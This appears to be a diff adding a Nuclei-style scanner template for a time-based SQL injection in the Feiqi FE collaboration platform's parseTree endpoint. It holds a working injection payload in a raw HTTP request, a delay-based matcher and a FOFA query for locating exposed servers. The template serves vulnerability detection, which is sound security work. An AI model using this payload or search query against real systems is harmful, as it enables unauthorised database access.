@@ -1,0 +1,33 @@
+id: flyrise-fe-parsetree-sqli
+
+info:
+  name: 飞企互联 OA parseTree sql注入漏洞
+  author: qwtd
+  severity: high
+  description: |
+    FOFA: "flyrise.stopBackspace.js"
+  tags: 飞企互联-FE业务协作平台
+
+http:
+  - raw:
+      - |
+        GET /common/parseTree.js%70?code=1%27;waitfor+delay+%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: JSESSIONID=9AC1ACE8D5768E86B30AFF9912E6249A
+        Upgrade-Insecure-Requests: 1
+    
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5
+
+      - type: status
+        status:
+          - 500
+
